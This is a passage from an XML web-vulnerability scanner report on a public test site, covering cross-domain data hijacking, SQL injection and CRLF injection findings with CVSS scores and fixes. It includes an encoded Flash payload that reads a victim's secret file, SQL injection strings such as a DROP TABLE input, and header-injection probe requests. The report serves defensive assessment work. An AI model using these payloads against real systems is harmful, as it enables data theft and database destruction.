          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Annihilation]]></Database>
          <URL><![CDATA[http://ha.ckers.org/blog/20060602/xss-annihilation/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="24" color="orange">
       <Name><![CDATA[Cross domain data hijacking]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">p</font></b> was set to <b><font color="dark">CWS%07%0e000x%9c%3d%8d1N%c3%40%10E%df%ae%8d%bdI%08)%d3%40%1d%a0%a2%05%09%11%89HiP%22%05D%8bF%8e%0bG%26%1b%d9%8e%117%a0%a2%dc%82%8a%1br%04X;%21S%8c%fe%cc%9b%f9%ff%aa%cb7Jq%af%7f%ed%f2.%f8%01&gt;%9e%18p%c9c%9al%8b%aczG%f2%dc%beM%ec%abdkj%1e%ac%2c%9f%a5(%b1%eb%89T%c2Jj)%93%22%dbT7%24%9c%8fH%cbD6)%a3%0bx)%ac%ad%d8%92%fb%1f%5c%07C%ac%7c%80Q%a7Nc%f4b%e8%fa%98%20b_%26%1c%9f5%20h%f1%d1g%0f%14%c1%0a%5ds%8d%8b0Q%a8L&lt;%9b6%d4L%bd_%a8w%7e%9d%5b%17%f3/%5b%dcm%7b%ef%cb%ef%e6%8d:n-%fb%b3%c3%dd.%e3d1d%ec%c7%3f6%cd0%09</font></b><br/>The value is reflected at the top of the page.]]></Details>
       <Affects><![CDATA[/hpp/params.php]]></Affects>
       <Parameter><![CDATA[p]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[An attacker can read any secrets (such as CSRF tokens) from the affected domain.]]></Impact>
       <Description><![CDATA[This page is possibly vulnerable to Cross domain data hijacking. If an attacker can create/upload a malicious Flash (SWF) file or control the top part of any page he can perform an attack known as <b>Cross domain data hijacking</b>. The Content-Type of the response doesn't matter. If the file is embedded using an &lt;object&gt; tag, it will be executed as a Flash file as long as the content of the file looks like a valid Flash file. 
<p> Here is the attack scenario:
<ul>
<li>An attacker creates a malicious Flash (SWF) file</li>
<li>The attacker changes the file extension to JPG</li>
<li>The attacker uploads the file to victim.com</li>
<li>The attacker embeds the file on attacker.com using an tag with type &quot;application/x-shockwave-flash&quot;</li>
<li>The victim visits attacker.com, loads the file as embedded with the tag</li>
<li>The attacker can now send and receive arbitrary requests to victim.com using the victims session</li>
<li>The attacker sends a request to victim.com and extracts the CSRF token from the response</li>
</ul>
</p>

<p>
There are many ways to perform this attack. The attacker doesn't need to upload a file. The only requirement is that an attacker can control the data on a location of the target domain. One way is to abuse a JSONP API. Usually, the attacker can control the output of a JSONP API endpoint by changing the callback parameter. However, if an attacker uses an entire Flash file as callback, we can use it just like we would use an uploaded file in this attack. </p>

A payload could look like this:
<pre wrap="virtual">
&lt;object style=&quot;height:1px;width:1px;&quot; data=&quot;http://victim.com/user/jsonp?callback=CWS%07%0E000x%9C%3D%8D1N%C3%40%10E%DF%AE%8D%BDI%08%29%D3%40%1D%A0%A2%05%09%11%89HiP%22%05D%8BF%8E%0BG%26%1B%D9%8E%117%A0%A2%DC%82%8A%1Br%04X%3B%21S%8C%FE%CC%9B%F9%FF%AA%CB7Jq%AF%7F%ED%F2%2E%F8%01%3E%9E%18p%C9c%9Al%8B%ACzG%F2%DC%BEM%EC%ABdkj%1E%AC%2C%9F%A5%28%B1%EB%89T%C2Jj%29%93%22%DBT7%24%9C%8FH%CBD6%29%A3%0Bx%29%AC%AD%D8%92%FB%1F%5C%07C%AC%7C%80Q%A7Nc%F4b%E8%FA%98%20b%5F%26%1C%9F5%20h%F1%D1g%0F%14%C1%0A%5Ds%8D%8B0Q%A8L%3C%9B6%D4L%BD%5F%A8w%7E%9D%5B%17%F3%2F%5B%DCm%7B%EF%CB%EF%E6%8D%3An%2D%FB%B3%C3%DD%2E%E3d1d%EC%C7%3F6%CD0%09&quot; type=&quot;application/x-shockwave-flash&quot; allowscriptaccess=&quot;always&quot; flashvars=&quot;c=alert&amp;u=http://victim.com/secret_file.txt&quot;&gt;&lt;/object&gt;
</pre>]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[For file uploads: It is recommended to check the file's content to have the correct header and format. If possible, use &quot;Content-Disposition: attachment; filename=Filename.Extension;&quot; header for the files that do not need to be served in the web browser. Isolating the domain of the uploaded files is also a good solution as long as the crossdomain.xml file of the main website does not include the isolated domain. <br/><br/>

For other cases: For JSONP abuses or other cases when the attacker control the top part of the page, you need to perform proper input filtering to protect against this type of issues.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /hpp/params.php?p=CWS%07%0e000x%9c%3d%8d1N%c3%40%10E%df%ae%8d%bdI%08)%d3%40%1d%a0%a2%05%09%11%89HiP%22%05D%8bF%8e%0bG%26%1b%d9%8e%117%a0%a2%dc%82%8a%1br%04X;%21S%8c%fe%cc%9b%f9%ff%aa%cb7Jq%af%7f%ed%f2.%f8%01&gt;%9e%18p%c9c%9al%8b%aczG%f2%dc%beM%ec%abdkj%1e%ac%2c%9f%a5(%b1%eb%89T%c2Jj)%93%22%dbT7%24%9c%8fH%cbD6)%a3%0bx)%ac%ad%d8%92%fb%1f%5c%07C%ac%7c%80Q%a7Nc%f4b%e8%fa%98%20b_%26%1c%9f5%20h%f1%d1g%0f%14%c1%0a%5ds%8d%8b0Q%a8L&lt;%9b6%d4L%bd_%a8w%7e%9d%5b%17%f3/%5b%dcm%7b%ef%cb%ef%e6%8d:n-%fb%b3%c3%dd.%e3d1d%ec%c7%3f6%cd0%09&amp;pp=12 HTTP/1.1
Referer: http://testphp.vulnweb.com/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:46:35 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 223
]]></Response>
       </TechnicalDetails>
       <CWE id="20"><![CDATA[CWE-20]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:N/I:P/A:N]]></Descriptor>
          <Score><![CDATA[4.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Cross Domain Data Hijacking ]]></Database>
          <URL><![CDATA[https://soroush.secproject.com/blog/2014/05/even-uploading-a-jpg-file-can-lead-to-cross-domain-data-hijacking-client-side-attack/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The pitfalls of allowing file uploads on your website]]></Database>
          <URL><![CDATA[http://blog.detectify.com/post/86298380233/the-pitfalls-of-allowing-file-uploads-on-your-website]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="25" color="red">
       <Name><![CDATA[SQL injection]]></Name>
       <ModuleName><![CDATA[Scripting (Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[Path Fragment (suffix .html) input <b><font color="dark">-</font></b> was set to <b><font color="dark">1'&quot;</font></b><br/>Error message found: <pre wrap="virtual"><font color="blue">Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/Mod_Rewrite_Shop/rate.php on line 8</font></pre>]]></Details>
       <Affects><![CDATA[/]]></Affects>
       <Parameter><![CDATA[-]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /Mod_Rewrite_Shop/RateProduct-1'%22.html HTTP/1.1
Referer: http://testphp.vulnweb.com/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:46:30 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 137
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="26" color="orange">
       <Name><![CDATA[CRLF injection/HTTP response splitting (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (CRLF_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">r</font></b> was set to <b><font color="dark">ACUSTART
ACUEND</font></b>]]></Details>
       <Affects><![CDATA[/redir.php]]></Affects>
       <Parameter><![CDATA[r]]></Parameter>
       <AOP_SourceFile><![CDATA[/hj/var/www//redir.php]]></AOP_SourceFile>
       <AOP_SourceLine>3</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Is it possible for a remote attacker to inject custom HTTP headers. For example, an attacker can inject session cookies or HTML code. This may conduct to vulnerabilities like XSS (cross-site scripting) or session fixation.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to CRLF injection attacks. <br/><br/>HTTP headers have the structure &quot;Key: Value&quot;, where each line is separated by the CRLF combination. If the user input is injected into the value section without properly escaping/removing CRLF characters it is possible to alter the HTTP headers structure.<br/>
HTTP Response Splitting is a new application attack technique which enables various new attacks such as web cache poisoning, cross user defacement, hijacking pages with sensitive user information and cross-site scripting (XSS). The attacker sends a single HTTP request that forces the web server to form an output stream, which is then interpreted by the target as two HTTP responses instead of one response.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[You need to restrict CR(0x13) and LF(0x10) from the user input or properly encode the output in order to prevent the injection of custom HTTP headers.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /redir.php?r=ACUSTART%0d%0aACUEND HTTP/1.1
Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c
Acunetix-Aspect: enabled
Referer: http://testphp.vulnweb.com/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:46:36 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 141
]]></Response>
       </TechnicalDetails>
       <CWE id="113"><![CDATA[CWE-113]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:P/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.4]]></Score>
          <TempScore><![CDATA[]]></TempScore>
